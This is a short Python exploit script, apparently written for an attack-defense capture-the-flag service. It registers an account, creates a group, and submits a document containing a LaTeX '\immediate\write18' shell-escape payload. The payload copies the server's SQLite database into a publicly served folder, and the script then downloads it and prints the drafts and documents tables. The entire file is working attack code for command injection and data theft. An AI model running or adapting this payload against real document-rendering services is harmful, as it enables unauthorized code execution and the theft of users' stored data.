from sys import argv
from time import sleep
from requests import Session
import sqlite3

ip = argv[1]

url = 'http://%s:8888' % ip


class CsrfSession(Session):
    def post(self, url, data=None, json=None, **kwargs):
        if not data:
            data = dict()
        data['csrfmiddlewaretoken'] = self.cookies.get('csrftoken')
        return super().post(url, data, json, **kwargs)


s = CsrfSession()
login = 'lolololo'
password = 'kekekekek'

data = dict(
    username=login,
    password=password,

)

new_data = data
new_data.update({'password2': password, 'signup_submit': 'Enter'})

s.get(url + '/auth/register')
s.post(url + '/auth/register', data=new_data)

s.get(url + '/auth/login')
new_data = data
new_data.update({'signup_submit': 'Enter'})
s.post(url + '/auth/login', data=new_data)

group_name = 'mmasmdamsdmasmd'
s.get(url + '/groups/create')
r = s.post(url + '/groups/create', data=dict(name=group_name))
group_url = r.url

print(group_url)

file_name = 'long_file_name.sqlite3'

exploit = r'\immediate\write18{cp data/db.sqlite3 data/rendered_docs/%s}' % file_name

document_urls = group_url + 'documents/create'
post_data = dict(title="exploit", text=exploit)
s.get(document_urls)
response = s.post(document_urls, data=post_data)

sleep(1)

print(url + '/rendered_docs/' + file_name)
r = s.get(url + '/rendered_docs/' + file_name, stream=True)

with open('tmp.db', 'wb') as o:
    o.write(r.raw.read())
    o.close()

c = sqlite3.connect('tmp.db')
cursor = c.cursor()
cursor.execute('SELECT * FROM web_draft')
print(cursor.fetchall())
cursor.execute('SELECT * FROM main.groups_document')
print(cursor.fetchall())
